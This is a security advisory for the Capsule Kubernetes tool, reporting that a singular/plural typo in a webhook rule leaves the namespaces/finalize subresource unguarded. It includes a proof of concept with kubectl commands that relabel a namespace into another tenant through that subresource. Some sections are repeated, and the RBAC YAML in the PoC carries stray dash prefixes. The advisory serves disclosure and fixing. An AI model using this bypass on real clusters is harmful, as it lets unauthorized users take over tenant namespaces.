# [M] Capsule: Incomplete fix of CVE-2026-30963: singular/plural typo leaves namespaces/finalize unprotected

## Summary
Severity: Medium
Advisory: GHSA-gwxr-7h77-7777
CVE: CVE-2026-55636
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-gwxr-7h77-7777
Type: github-advisory

## Affected
- Go: `github.com/projectcapsule/capsule` — affected >=0.13.0 <0.13.6

## Details
### Summary
Capsule v0.13.2 webhook rules contain `namespace/finalize` (singular) instead of `namespaces/finalize` (plural). K8s requires plural. The finalize defense from CVE-2026-30963 fix is absent.

### Details
PUT to `/api/v1/namespaces/<ns>/finalize` has resource=namespaces (plural). The singular rule never matches. `matchPolicy: Equivalent` does not compensate.

### PoC
Confirmed on kind + Capsule v0.13.2. alice (non-admin with namespaces/finalize RBAC): `kubectl label --as=alice` = DENIED (control). `kubectl replace --raw /finalize --as=alice` = 200 OK (bypass). Tenant label changed.

### Impact
Namespace tenant-label hijack. Same threat model as CVE-2026-30963. One-char fix: `namespace/finalize` -> `namespaces/finalize`.
The CVE-2026-30963 fix in Capsule v0.13.2 added subresource entries to the namespace validating webhook, but `charts/capsule/templates/configuration.yaml` line 105 contains a singular/plural typo: `namespace/finalize` instead of `namespaces/finalize`. Kubernetes webhook rules require the plural resource name. The finalize subresource defense is entirely absent.

### Details
In Kubernetes admission webhooks, `rules.resources` matches against the plural resource name. A PUT to `/api/v1/namespaces/<ns>/finalize` has `resource=namespaces` (plural). The rule `namespace/finalize` (singular) never matches any real API request.

The `matchPolicy: Equivalent` setting does NOT compensate (it handles API group/version variations, not resource name typos).

### PoC
Confirmed on kind cluster + Capsule v0.13.2 (Helm chart):
```bash
# Setup: alice with namespaces/finalize RBAC
kubectl apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: ns-finalize-updater
rules:
- apiGroups: [""]
-   resources: ["namespaces/finalize"]
-   verbs: ["update"]
- - apiGroups: [""]
-   resources: ["namespaces"]
-   verbs: ["get", "list"]
- EOF
- kubectl create clusterrolebinding alice-finalize --clusterrole=ns-finalize-updater --user=alice
# Control: normal label change DENIED
kubectl label namespace oil-prod capsule.clastix.io/tenant=evil --overwrite --as=alice
# Error: admission webhook denied

# Bypass: finalize changes tenant label (webhook NOT invoked)
kubectl get namespace oil-prod -o json > /tmp/ns.json
# modify tenant label to "hijacked"
kubectl replace --raw "/api/v1/namespaces/oil-prod/finalize" -f /tmp/ns_modified.json --as=alice
# 200 OK - tenant label changed
```

### Impact
Namespace tenant-label hijack via the finalize subresource bypass. Same threat model as CVE-2026-30963. One-character fix needed: `namespace/finalize` -> `namespaces/finalize`.

## References
- https://github.com/projectcapsule/capsule/security/advisories/GHSA-gwxr-7h77-7777
- https://github.com/projectcapsule/capsule
